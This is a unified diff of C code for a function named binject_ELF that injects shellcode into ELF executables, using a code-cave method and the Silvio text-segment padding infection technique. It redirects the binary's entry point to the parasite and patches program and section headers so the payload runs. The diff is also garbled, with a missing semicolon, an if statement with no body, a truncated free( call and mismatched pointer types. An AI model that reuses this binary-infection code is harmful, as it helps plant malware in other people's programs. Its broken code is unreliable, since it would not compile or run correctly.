@@ -12,7 +12,7 @@ int binject_ELF(char *file,char *shellcode,int method)
   struct Elf32_Ehdr ehdr=(struct Elf32_Ehdr*)address;
   if(method==CODE_CAVE)
   {
-	  address+=ehdr->sh_offset;
+	  address= file_buffer + ehdr->e_shoff;
   for(i=0;i<ehdr.shnum;i++)
   {       
 	  struct Elf32_shdr shdr=(struct Elf32_Shdr*)address;
@@ -36,56 +36,59 @@ int binject_ELF(char *file,char *shellcode,int method)
                         }
   if(method==SILVIO_METHOD)
   {
-	  for (phdr = (Elf32_Phdr *)pdata, i = 0; i < ehdr.e_phnum; i++) {
+	  address=file_buffer +ehdr->e_phoff
+	  for (i = 0; i < ehdr.e_phnum; i++) {
+		  struct Elf32_phdr phdr= (struct Elf32_phdr*)address;
 		if (offset) {
 			phdr->p_offset += 4096;
 		} else if (phdr->p_type == PT_LOAD && phdr->p_offset == 0) {
-/* 
-	is this the text segment ? Nothing says the offset must be 0 but it
-	normally is.
-*/
 			
 			ehdr.e_entry = p_vaddr+p_filesz;
+			int palen;
+
+			if (phdr->p_filesz != phdr->p_memsz) goto error;
+
+			evaddr = phdr->p_vaddr + phdr->p_filesz;
+			palen = PAGE_SIZE - (evaddr & (PAGE_SIZE - 1));
+
+			if (palen < vlen)
 			
 
+			ehdr.e_entry = evaddr + ventry;
+			offset = phdr->p_offset + phdr->p_filesz;
+
 			phdr->p_filesz += vlen;
+			phdr->p_filesz += 5;
 			phdr->p_memsz += vlen;
+			phdr->p_memsz += 5;
 		}
 
-		++phdr;
+		address+=phdr->filesz;
 	}
-	  if (offset == 0) goto error;
-
-/* patch the offset */
-	*(long *)&v[vhoff] = offset;
-
-/* read the shdr's */
-
-	if (lseek(fd, ehdr.e_shoff, SEEK_SET) < 0) goto error;
-	if (read(fd, (void *)sdata, slen) != slen) goto error;
-
-/* update the shdr's to reflect the insertion of the parasite */
-
-	for (shdr = (Elf32_Shdr *)sdata, i = 0; i < ehdr.e_shnum; i++) {
+	  if (offset == 0) 
+		  return -1;
+address=file_buffer+ehdr->e_shoff;
+	for ( i = 0; i < ehdr.e_shnum; i++) {
+		struct Elf32_Shdr shdr = (struct Elf32_Shdr*)address;
 		if (shdr->sh_offset >= offset) {
 			shdr->sh_offset += PAGE_SIZE;
-/* is this the last text section? */
 		} else if (shdr->sh_addr + shdr->sh_size == evaddr) {
-/* if its not strip safe then we cant use it */
 			if (shdr->sh_type != SHT_PROGBITS) goto error;
 
-			shdr->sh_size += vlen;
+			shdr->sh_size += sclen;
+			shdr->sh_size +=5;
 		}
 
-		++shdr;
+		address+=shdr->sh_size;
 	}
-
-/* update ehdr to reflect new offsets */
-
 	oshoff = ehdr.e_shoff;
 	if (ehdr.e_shoff >= offset) ehdr.e_shoff += PAGE_SIZE;
 
+ 
+memcpy(file_buffer+offset,shellcodefixe,sclen+5);
+  fwrite(file_buffer,1,size,f);
+  free(
 }
            
-  free(file_buffer);
+ 
 }
